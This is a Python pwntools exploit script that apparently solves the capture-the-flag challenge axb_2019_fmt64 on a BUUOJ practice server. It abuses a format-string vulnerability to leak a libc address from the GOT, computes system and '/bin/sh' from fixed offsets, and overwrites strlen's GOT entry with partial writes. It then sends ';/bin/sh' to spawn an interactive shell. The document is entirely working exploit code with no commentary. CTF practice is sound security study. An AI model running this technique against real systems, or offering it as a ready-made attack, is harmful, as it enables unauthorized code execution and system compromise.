# coding=utf-8
from pwn import * 

context.log_level='debug'

# io = process('./axb_2019_fmt64')
io = remote("node4.buuoj.cn", 25658)
elf = ELF("./axb_2019_fmt64")
puts_got = elf.got["puts"]
sprintf_got = elf.got["sprintf"]
strlen_got = elf.got["strlen"]
log.success('puts_got => ' + hex(puts_got))

# leak
# payload1 = p64(puts_got)+"%08$s" 
payload1 = "%9$s" + "AAAA" + p64(puts_got)
io.sendafter("Please tell me:",payload1)
print(io.recvuntil("Repeater:"))
puts_addr = u64(io.recvuntil("\x7f").ljust(8,"\x00"))
log.success('pust_addr => ' + hex(puts_addr))
pause()

libc_base = puts_addr - 0x06f6a0
system_addr = libc_base + 0x0453a0
str_bin_sh = libc_base + 0x18ce17
log.success('libc_base => ' + hex(libc_base))
log.success('system_addr => ' + hex(system_addr))
log.success('str_bin_sh => ' + hex(str_bin_sh))

high_sys = (system_addr >> 16) & 0xff
low_sys = system_addr & 0xffff
log.success('high_sys => ' + hex(high_sys))
log.success('low_sys => ' + hex(low_sys))

payload2 = "%" + str(high_sys - 9) + "c%12$hhn" + "%" + str(low_sys - high_sys) + "c%13$hn"
print(len(payload2))
print(payload2)
payload2 = payload2.ljust(32,"A") + p64(strlen_got + 2) + p64(strlen_got)

io.sendafter("Please tell me:", payload2) 

payload3 = ';/bin/sh\x00'

io.sendafter("Please tell me:",payload3)

io.interactive()
io.close()
